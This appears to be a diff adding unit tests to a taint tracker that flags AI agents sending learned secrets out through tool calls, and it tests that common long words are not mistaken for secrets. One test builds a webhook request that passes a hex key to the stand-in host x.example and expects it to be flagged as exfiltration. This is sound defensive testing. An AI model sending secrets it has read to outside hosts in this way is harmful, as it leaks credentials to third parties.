@@ -51,6 +51,33 @@ def test_delimited_pattern_ignores_plain_identifiers() -> None:
     assert "load-balancer-config" not in vals
 
 
+def test_ordinary_long_words_are_not_secrets() -> None:
+    """Known-issues #8: a coding agent that read code had its routine shell commands denied,
+    because every 12+ letter word it had seen (`verification`, `FactoryConfig`, a user name in
+    a path) was tainted."""
+    code = ("class FactoryConfig:\n    def verification(self): raise RuntimeError('configuration')\n"
+            "# /Users/mthandazondhlovu/projects/Authorization")
+    vals = extract_values(code)
+    for word in ("FactoryConfig", "verification", "RuntimeError", "configuration", "mthandazondhlovu",
+                 "Authorization"):
+        assert word not in vals
+    t = TaintTracker()
+    t.observe("read_file", code)
+    assert t.exfiltration_exclusions("post_webhook", {"cmd": 'grep -n "verification" FactoryConfig'}) == []
+
+
+def test_long_tokens_that_mix_letters_and_digits_are_still_secrets() -> None:
+    hex_key = "9f" + "86d081884c7d659a2feaa0c55ad015a3"   # hex, assembled at runtime
+    base62 = "Zq3" + "xK9mWv2LpR7tYb"
+    vals = extract_values(f"key={hex_key} token {base62}")
+    assert hex_key in vals and base62 in vals
+    t = TaintTracker()
+    t.observe("read_file", f"key={hex_key}")
+    assert t.exfiltration_exclusions("post_webhook", {"url": f"https://x.example/?k={hex_key}"}) == [
+        DATA_EXFILTRATION
+    ]
+
+
 def test_tracker_flags_egress_carrying_a_learned_value() -> None:
     t = TaintTracker()
     assert t.exfiltration_exclusions("send_email", {"body": SECRET}) == []  # nothing learned yet
